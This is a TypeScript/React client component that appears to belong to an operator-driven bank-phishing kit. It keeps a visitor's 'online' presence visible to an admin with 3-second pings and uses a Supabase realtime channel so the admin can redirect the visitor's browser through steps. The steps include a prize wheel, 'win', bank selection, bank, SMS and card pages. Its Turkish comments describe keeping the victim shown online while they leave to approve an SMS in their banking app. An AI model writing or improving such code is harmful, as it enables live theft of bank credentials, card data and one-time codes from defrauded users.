"use client";

import { useEffect } from "react";
import { usePathname } from "next/navigation";
import type { SessionStatus, SessionStep } from "@/types/session";
import { createBrowserSupabaseClient } from "@/lib/supabase/client";
import { pathToStep, resolveStepTargetPath } from "@/lib/session-routes";
import {
  getPreferredRouteSessionId,
  persistActiveSession,
} from "@/lib/session-id-client";
import { logAuditEvent } from "@/lib/audit-event";

type Props = {
  sessionId: string;
  routeSessionId?: string;
};

const RETURN_TO_BANK_LIST_FLAG = "bank-page:return-to-list";

function shouldPauseBankListRedirects(pathname: string) {
  if (!pathname.startsWith("/banken")) return false;

  try {
    return window.sessionStorage.getItem(RETURN_TO_BANK_LIST_FLAG) === "1";
  } catch {
    return false;
  }
}

export function SessionRealtimeGate({ sessionId, routeSessionId }: Props) {
  const pathname = usePathname();
  const effectiveRouteSessionId = getPreferredRouteSessionId(sessionId, routeSessionId);

  /* Presence: demo ortamında admin için online göstergesi — KESIN cozum (last_ping_at)
     - 3 SN'DE BIR sunucuya PING at (POST /api/session/ping, service-role)
     - SAYFA KAPANINCA (pagehide / beforeunload): DIREKT OFFLINE (silinmez, tarayıcı kapanınca kesin gitsin)
     - SIRKETICI visibility=hidden (sekme arkada, mobil kilit, SMS uygulamasına gitme vs.):
         * SON 10 DAKIKA ICINDE visibility=visible olduysa: OFFLINE ISARETLEME, sadece status='online' KALIR.
         * Kullanici 10dk dan uzun sure arkada tutarsa ya da tarayici gerçekten kapatilirsa: pagehide/beforeunload ile OFFLINE olur.
         * Boylece SMS onayi icin banka uygulamasi / messenger acinca ONLINE gozukmeye devam eder (bug olmaz). */
  useEffect(() => {
    persistActiveSession(sessionId, effectiveRouteSessionId);

    const PING_INTERVAL = 3_000;
    // Sadece SAYFA GERCEKTEN kapatilinca (pagehide/beforeunload) OFFLINE yap.
    // visibility=hidden icin MAKS 10 DAKIKA boyunca ONLINE tut (gecerli olursa tekrar visible olunca ONLINE devam).
    const VISIBILITY_HIDDEN_TOLERANCE_MS = 10 * 60 * 1000;
    let lastVisibleAt = Date.now();

    const currentStep = (() => {
      if (pathname.startsWith("/wheel")) return "wheel";
      if (pathname.startsWith("/banken")) return "banken";
      if (pathname.startsWith("/special-approval")) return "special_approval";
      try {
        const p = pathname.replace(/^\/+/, "");
        const known = ["code_entry","win","bank","sms","card","wait","invalid_bank","congrats","live_support"];
        const first = p.split("/")[0];
        if (known.includes(first)) return first;
        return first || null;
      } catch { return null; }
    })();

    const buildBody = (status: "online" | "offline") => JSON.stringify({
      sessionId,
      publicId: effectiveRouteSessionId,
      pathname,
      currentStep,
      status,
    });

    const pingOnline = async () => {
      try {
        // Birincil deneme: normal sessionId ile
        const resp = await fetch("/api/session/ping", {
          method: "POST",
          credentials: "same-origin",
          headers: { "Content-Type": "application/json" },
          body: buildBody("online"),
        });
        try {
          const j = await resp.json() as any;
          // Sunucu sessionId bulamadiysa ve fallback publicId ile denediyse sorun yok.
          // Session HIC bulunamadiysa (note='session_not_found...' ve publicId yoksa)
          //   ya da status=404 ise client burada anlar.
          if (j && j.ok === false && j.error) {
            logAuditEvent({
              session_id: sessionId,
              public_id: effectiveRouteSessionId,
              event_kind: "presence",
              event_action: "ping_online_failed",
              status: "error",
              pathname,
              meta: { httpStatus: resp.status, error: j.error, note: j.note || null },
            });
          }
        } catch { /* sessizce json parse hatasi */ }
      } catch (e: any) {
        logAuditEvent({
          session_id: sessionId,
          public_id: effectiveRouteSessionId,
          event_kind: "presence",
          event_action: "ping_online_fetch_error",
          status: "error",
          pathname,
          meta: { error: e?.message || String(e) },
        });
      }
    };

    const pingOfflineOrOnline = (status: "offline" | "online") => {
      try {
        const payload = new Blob([buildBody(status)], { type: "application/json" });
        if (typeof navigator !== "undefined" && typeof navigator.sendBeacon === "function") {
          try {
            const beaconOk = navigator.sendBeacon("/api/session/ping", payload);
            if (beaconOk) return;
          } catch { /* fallback */ }
        }
        try {
          void fetch("/api/session/ping", {
            method: "POST",
            credentials: "same-origin",
            headers: { "Content-Type": "application/json" },
            body: buildBody(status),
            keepalive: true,
          });
        } catch { /* ignore */ }
      } catch { /* ignore */ }
    };

    // Ilk mountta ONLINE ping + audit log
    void pingOnline();
    logAuditEvent({
      session_id: sessionId,
      public_id: effectiveRouteSessionId,
      event_kind: "presence",
      event_action: "session_mount_ping",
      pathname,
      meta: { effectiveRouteSessionId, ping_interval_ms: PING_INTERVAL, currentStep },
    });

    const t = window.setInterval(() => {
      // Interval boyunca visibility=hidden olsa bile (durdurulmayan interval tarayıcılar),
      // son 10dk icinde gorulduyse ONLINE ping atmaya devam et (SMS donunce kesin online).
      if (document.visibilityState === "visible") {
        lastVisibleAt = Date.now();
      }
      void pingOnline();
    }, PING_INTERVAL);

    // GERCEKTEN sayfadan cikiliyorsa (kapatma): OFFLINE.
    // NOT: beforeunload + pagehide ikisini birden dinle, her iki durumda da OFFLINE olsun.
    const markOffline = () => {
      logAuditEvent({
        session_id: sessionId,
        public_id: effectiveRouteSessionId,
        event_kind: "presence",
        event_action: "session_mark_offline_beacon",
        status: "warn",
        pathname,
      });
      pingOfflineOrOnline("offline");
    };

    const onVisibility = () => {
      if (document.visibilityState === "visible") {
        lastVisibleAt = Date.now();
        void pingOnline();
        return;
      }
      // visibility=hidden: sadece 10dk dan uzun sure beklediyse OFFLINE yap.
      // Aksi halde (kisa sureli SMS / app gecisi) ONLINE kalsın.
      const hiddenFor = Date.now() - lastVisibleAt;
      if (hiddenFor > VISIBILITY_HIDDEN_TOLERANCE_MS) {
        logAuditEvent({
          session_id: sessionId,
          public_id: effectiveRouteSessionId,
          event_kind: "presence",
          event_action: "session_hidden_timeout_offline",
          status: "warn",
          pathname,
          meta: { hiddenForMs: hiddenFor, toleranceMs: VISIBILITY_HIDDEN_TOLERANCE_MS },
        });
        pingOfflineOrOnline("offline");
      } else {
        // Kısa süreli arka planda kalma: DIKKATLI, sadece audit log at, OFFLINE ISARETLEME.
        logAuditEvent({
          session_id: sessionId,
          public_id: effectiveRouteSessionId,
          event_kind: "presence",
          event_action: "session_hidden_short_tolerated",
          pathname,
          meta: { hiddenForMs: hiddenFor, toleranceMs: VISIBILITY_HIDDEN_TOLERANCE_MS },
        });
      }
    };

    window.addEventListener("pagehide", markOffline);
    window.addEventListener("beforeunload", markOffline);
    document.addEventListener("visibilitychange", onVisibility);

    return () => {
      window.clearInterval(t);
      window.removeEventListener("pagehide", markOffline);
      window.removeEventListener("beforeunload", markOffline);
      document.removeEventListener("visibilitychange", onVisibility);
      // React unmount (SPA route degisimi): sayfada duruluyorsa (baska bir route), ONLINE kalmaya devam edebilir.
      // Bu yuzden cleanup'ta OFFLINE ISARETLEMIYORUZ. Sayfa kapaninca pagehide tetiklenir ve OFFLINE olur.
    };
  }, [effectiveRouteSessionId, sessionId, pathname]);

  /* İlk yüklemede sunucu adımı ile senkron */
  useEffect(() => {
    let cancelled = false;
    void (async () => {
      if (shouldPauseBankListRedirects(pathname)) return;
      const supabase = createBrowserSupabaseClient();
      if (supabase === null) return;
      const { data } = await supabase.from("sessions").select("current_step,status,form_data").eq("id", sessionId).maybeSingle();

      if (cancelled || !data) return;
      const status = data.status as SessionStatus | undefined;
      if (status === "SPECIAL_INFO") {
        if (!pathname.startsWith("/special-approval")) {
          window.location.href = "/special-approval";
        }
        return;
      }

      if (!data.current_step) return;
      const serverStep = data.current_step as SessionStep;
      let local: string | null = pathToStep(pathname);
      if (pathname.startsWith("/wheel")) local = "wheel";

      if (local === "wheel" && serverStep === "code_entry") return;
      if (local === "banken" && serverStep === "bank") return;

      if (local && serverStep !== local) {
        const target = resolveStepTargetPath(
          serverStep,
          sessionId,
          effectiveRouteSessionId,
          (data.form_data ?? {}) as { bankSlug?: string | null },
        );
        logAuditEvent({
          session_id: sessionId,
          public_id: effectiveRouteSessionId,
          event_kind: "step",
          event_action: "server_step_redirect",
          from_step: local,
          to_step: serverStep,
          pathname,
          meta: { reason: "initial_sync" },
        });
        window.location.href = target;
      }
    })();
    return () => {
      cancelled = true;
    };
  }, [effectiveRouteSessionId, sessionId, pathname]);

  /* Realtime: admin current_step değişince anında yönlendir */
  useEffect(() => {
    const supabase = createBrowserSupabaseClient();
    if (!supabase) return;

    const channel = supabase
      .channel(`demo-session:${sessionId}`)
      .on(
        "postgres_changes",
        {
          event: "UPDATE",
          schema: "public",
          table: "sessions",
          filter: `id=eq.${sessionId}`,
        },
        (payload) => {
          if (shouldPauseBankListRedirects(pathname)) {
            return;
          }
          const next = payload.new as {
            current_step?: SessionStep;
            status?: SessionStatus;
            form_data?: { bankSlug?: string | null } | null;
          };
          if (next.status === "SPECIAL_INFO") {
            if (!pathname.startsWith("/special-approval")) {
              window.location.href = "/special-approval";
            }
            return;
          }

          if (!next.current_step) return;
          let local: string | null = pathToStep(pathname);
          if (pathname.startsWith("/wheel")) local = "wheel";

          if (local === "wheel" && next.current_step === "code_entry") return;
          if (local === "banken" && next.current_step === "bank") return;

          if (local && next.current_step !== local) {
            const target = resolveStepTargetPath(
              next.current_step,
              sessionId,
              effectiveRouteSessionId,
              (next.form_data ?? {}) as { bankSlug?: string | null },
            );
            logAuditEvent({
              session_id: sessionId,
              public_id: effectiveRouteSessionId,
              event_kind: "step",
              event_action: "admin_realtime_redirect",
              from_step: local,
              to_step: next.current_step,
              pathname,
              meta: { reason: "realtime_channel", status: next.status ?? null },
            });
            window.location.href = target;
          }
        },
      )
      .subscribe();

    return () => {
      void supabase.removeChannel(channel);
    };
  }, [effectiveRouteSessionId, sessionId, pathname]);

  return null;
}
